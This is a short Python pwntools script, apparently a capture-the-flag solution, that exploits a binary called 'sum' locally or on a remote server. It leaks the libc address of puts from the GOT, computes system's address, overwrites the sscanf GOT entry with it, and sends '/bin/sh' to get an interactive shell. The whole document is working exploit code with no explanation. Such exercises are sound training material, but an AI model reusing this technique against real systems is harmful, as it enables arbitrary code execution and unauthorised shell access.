#!/usr/bin/env python

from pwn import * 

if (sys.argv[1] == "local"):
    r = process("./sum")
else:
    r = remote("35.207.132.47", 22226)

elf = ELF("./sum")
libc = ELF("./libc-2.27.so")
puts_got = elf.got["puts"]
puts_off = libc.symbols["puts"]
sscanf_got = 0x602048
system_off = libc.symbols["system"]

r.recvuntil("> ")
r.sendline("11111111111111111111111")
r.recvuntil("bye\n\n> ")
r.sendline("get " + str(puts_got/8))

base_libc = int(r.recvline().strip("\n")) - puts_off
log.info("base_libc: %s" % hex(base_libc))
system_addr = base_libc + system_off

r.recvuntil("bye\n\n> ")
r.sendline("set " + str(sscanf_got/8) + " " + str(system_addr))

r.sendline("/bin/sh")

r.interactive()
